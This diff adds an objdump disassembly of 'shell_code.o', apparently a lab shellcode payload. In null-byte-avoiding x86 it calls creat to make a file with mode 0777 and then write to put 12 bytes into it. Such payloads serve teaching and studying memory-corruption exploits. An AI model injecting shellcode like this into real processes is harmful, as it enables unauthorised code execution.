@@ -1,0 +1,26 @@
+
+shell_code.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	31 c0                	xor    %eax,%eax
+   2:	b0 08                	mov    $0x8,%al
+   4:	89 e3                	mov    %esp,%ebx
+   6:	66 81 eb 49 02       	sub    $0x249,%bx
+   b:	89 de                	mov    %ebx,%esi
+   d:	31 c9                	xor    %ecx,%ecx
+   f:	88 4b 0a             	mov    %cl,0xa(%ebx)
+  12:	66 b9 ff 01          	mov    $0x1ff,%cx
+  16:	cd 80                	int    $0x80
+  18:	89 c3                	mov    %eax,%ebx
+  1a:	89 f0                	mov    %esi,%eax
+  1c:	83 c0 0b             	add    $0xb,%eax
+  1f:	89 c6                	mov    %eax,%esi
+  21:	31 c0                	xor    %eax,%eax
+  23:	b0 04                	mov    $0x4,%al
+  25:	89 f1                	mov    %esi,%ecx
+  27:	31 d2                	xor    %edx,%edx
+  29:	b2 0c                	mov    $0xc,%dl
+  2b:	cd 80                	int    $0x80
